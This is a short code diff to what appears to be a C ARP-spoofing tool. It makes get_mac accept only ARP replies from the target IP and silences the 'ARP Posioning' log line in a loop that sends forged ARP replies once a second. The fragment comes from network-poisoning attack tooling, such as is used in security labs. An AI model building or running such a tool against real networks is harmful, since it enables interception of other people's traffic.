@@ -1,4 +1,6 @@
 #include "arpspoof.h"
+#include "utils.h"
+
 
 uint8_t* construct_arp_pac(int sock_r, struct sockaddr_ll socket_address, unsigned int addr_len, uint8_t* sha, uint8_t* tha, uint8_t* spa, uint8_t* tpa, unsigned int op){
     struct ether_header *eth_hdr = (struct ether_header*) malloc(sizeof(struct ether_header));
@@ -69,7 +71,7 @@ uint8_t* get_mac(int sock_r, struct sockaddr_ll socket_address, unsigned int add
         
         //fprintf(stderr, "%d\n", byte_recv);
         
-        if(byte_recv > 0 && ntohs(arp_hdr->ea_hdr.ar_op) == ARPOP_REPLY){
+        if(byte_recv > 0 && ntohs(arp_hdr->ea_hdr.ar_op) == ARPOP_REPLY && compare_ip(target_ip, arp_hdr->arp_spa) == 1){
             for(index = 0;index < ETH_ALEN; index++)
                 *(target_mac+index) = *(arp_hdr->arp_sha+index);
             free(arp_req);
@@ -103,7 +105,7 @@ void *arp_spoofing(void *args){
             fprintf(stderr,"Error in sending ARP reply at time %d\n", count);
         else{
             count++;
-            fprintf(stderr,"ARP Posioning...%d time\n", count);
+            //fprintf(stderr,"ARP Posioning...%d time\n", count);
         }
         sleep(1);
     } while(1);
